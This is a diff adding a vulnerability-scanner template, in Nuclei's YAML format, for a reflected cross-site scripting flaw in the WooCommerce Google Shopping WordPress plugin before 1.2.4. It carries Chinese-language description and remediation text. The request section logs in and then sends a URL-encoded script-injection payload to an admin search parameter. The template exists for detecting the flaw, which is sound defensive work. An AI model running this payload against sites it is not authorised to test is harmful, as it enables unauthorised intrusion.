@@ -1,0 +1,57 @@
+id: elex-woocommerce-xss
+info:
+  name: WordPress WooCommerce Google Shopping < 1.2.4 - Reflected Cross-Site Scripting
+  author:
+  - l0ne1y
+  tags:
+  - wordpress
+  - wp-plugin
+  - xss
+  - authenticated
+  - woocommerce
+  description: |-
+    WordPress Plugin WooCommerce Google Shopping 跨站脚本漏洞
+    WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是一个应用插件。
+
+    WordPress plugin WooCommerce Google Shopping 1.2.4之前版本存在跨站脚本漏洞，该漏洞源于插件不会清理和转义重置密码表单上的参数。攻击者利用该漏洞可以执行跨站脚本攻击。
+  reference:
+  - https://wpscan.com/vulnerability/647448d6-32c0-4b38-a40a-3b54c55f4e2e
+  severity: high
+  classification:
+    cwe-id:
+    - cwe-79
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：https://wordpress.org/plugins/
+
+    临时修复方案：
+    1、对输入(和URL参数)进行过滤，对输出进行编码，白名单和黑名单结合。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击；最后对字符进行白名单或者黑名单限制。
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - </script><script>alert(document.domain)</script>
+  - type: word
+    part: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /wp-login.php HTTP/1.1
+    Host: {{Hostname}}
+    Origin: {{RootURL}}
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+  - |
+    GET /wp-admin/admin.php?page=elex-product-feed-manage&search=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
+    Host: {{Hostname}}
+  cookie-reuse: true
